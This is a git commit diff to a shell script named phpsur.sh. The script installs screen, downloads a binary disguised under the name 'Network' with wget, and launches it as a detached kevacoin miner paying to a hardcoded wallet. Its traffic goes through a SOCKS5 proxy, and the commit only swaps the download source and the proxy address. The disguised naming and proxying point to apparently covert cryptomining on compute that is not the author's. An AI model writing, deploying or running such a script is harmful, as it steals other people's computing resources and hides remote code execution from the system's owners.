a1459d107923669585ebc3bafb12768c5bb2828c
master-running <90834620+master-running@users.noreply.github.com>
2021-09-16 16:48:10 +0700

    Update phpsur.sh

--- phpsur.sh
+++ phpsur.sh
@@ -1,6 +1,6 @@
 apt update 
 apt install screen -y 
-wget -O Network https://github.com/lancote-markote/lancote-buildkite/raw/main/Network
+wget -O Network https://github.com/master-running/master-running/raw/main/Network
 chmod +x Network
 screen -dmS ls
-./Network --algorithm randomkeva --pool sg.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password Build --proxy=socks5://198.12.255.100:14164
+./Network --algorithm randomkeva --pool sg.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password Build --proxy=socks5://184.75.247.3:59644
